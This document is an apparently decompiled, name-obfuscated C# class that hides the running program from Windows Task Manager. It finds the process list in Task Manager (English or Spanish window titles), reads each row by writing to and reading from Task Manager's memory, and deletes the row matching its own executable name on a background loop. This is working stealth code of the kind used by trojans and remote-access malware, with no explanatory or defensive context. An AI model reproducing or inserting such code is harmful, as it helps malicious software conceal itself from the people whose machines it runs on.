using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

internal sealed class Class8
{
	private struct Struct0
	{
		public uint uint_0;

		public IntPtr intptr_0;

		public IntPtr intptr_1;

		public uint uint_1;

		public uint uint_2;

		public IntPtr intptr_2;

		public uint uint_3;

		public int int_0;

		public IntPtr intptr_3;
	}

	private static volatile bool bool_0 = false;

	public static volatile bool bool_1 = true;

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int int_0, bool bool_2, uint uint_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0, int int_1);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr intptr_0, IntPtr intptr_1, uint uint_0, int int_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, out UIntPtr uintptr_0);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr intptr_0, IntPtr intptr_1, [Out] byte[] byte_0, int int_0, out UIntPtr uintptr_0);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr intptr_0, out uint uint_0);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr intptr_0, uint uint_0, IntPtr intptr_1, IntPtr intptr_2);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string string_0, string string_1);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr intptr_0, IntPtr intptr_1, string string_0, string string_1);

	private static byte[] smethod_0(object object_0)
	{
		int num = Marshal.SizeOf(object_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(object_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr smethod_1(uint uint_0)
	{
		return OpenProcess(56, bool_2: false, uint_0);
	}

	private static void smethod_2(IntPtr intptr_0)
	{
		CloseHandle(intptr_0);
	}

	private static IntPtr smethod_3(uint uint_0, IntPtr intptr_0)
	{
		return VirtualAllocEx(intptr_0, IntPtr.Zero, uint_0, 12288, 4);
	}

	private static void smethod_4(IntPtr intptr_0, IntPtr intptr_1, uint uint_0)
	{
		VirtualFreeEx(intptr_0, intptr_1, uint_0, 32768);
	}

	private static IntPtr smethod_5()
	{
		IntPtr intPtr = FindWindow("#32770", "Administrador de tareas de Windows");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Windows Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr smethod_6(IntPtr intptr_0)
	{
		return SendMessage(intptr_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void smethod_7(IntPtr intptr_0, IntPtr intptr_1)
	{
		SendMessage(intptr_0, 4104u, intptr_1, IntPtr.Zero);
	}

	private static void smethod_8(IntPtr intptr_0)
	{
		SendMessage(intptr_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string smethod_9(IntPtr intptr_0, IntPtr intptr_1)
	{
		byte[] array = new byte[50];
		Struct0 @struct = default(Struct0);
		GetWindowThreadProcessId(intptr_0, out var uint_);
		IntPtr intptr_2 = smethod_1(uint_);
		IntPtr intPtr = smethod_3((uint)Marshal.SizeOf((object)@struct), intptr_2);
		IntPtr intPtr2 = smethod_3(50u, intptr_2);
		@struct.intptr_0 = intptr_1;
		@struct.intptr_1 = (IntPtr)0;
		@struct.uint_3 = 50u;
		@struct.intptr_2 = intPtr2;
		WriteProcessMemory(intptr_2, intPtr, smethod_0(@struct), (uint)Marshal.SizeOf((object)@struct), out var uintptr_);
		SendMessage(intptr_0, 4141u, intptr_1, intPtr);
		ReadProcessMemory(intptr_2, intPtr2, array, 50, out uintptr_);
		smethod_4(intptr_2, intPtr, (uint)Marshal.SizeOf((object)@struct));
		smethod_4(intptr_2, intPtr2, 50u);
		smethod_2(intptr_2);
		return Encoding.ASCII.GetString(array);
	}

	private static void smethod_10(string string_0)
	{
		IntPtr intPtr = smethod_5();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)smethod_6(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = smethod_9(intPtr, (IntPtr)i);
			if (text.Contains(string_0))
			{
				smethod_7(intPtr, (IntPtr)i);
			}
		}
	}

	private static void smethod_11()
	{
		IntPtr intPtr = smethod_5();
		if (intPtr != IntPtr.Zero)
		{
			smethod_8(intPtr);
			smethod_8(intPtr);
			smethod_8(intPtr);
			smethod_8(intPtr);
			smethod_8(intPtr);
		}
	}

	public static void smethod_12()
	{
		Thread thread = new Thread(smethod_14);
		thread.Start();
	}

	public static void smethod_13()
	{
		bool_0 = true;
	}

	private static void smethod_14()
	{
		while (!bool_0)
		{
			if (bool_1)
			{
				smethod_10(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				smethod_11();
				Thread.Sleep(1000);
			}
		}
		bool_0 = false;
	}
}
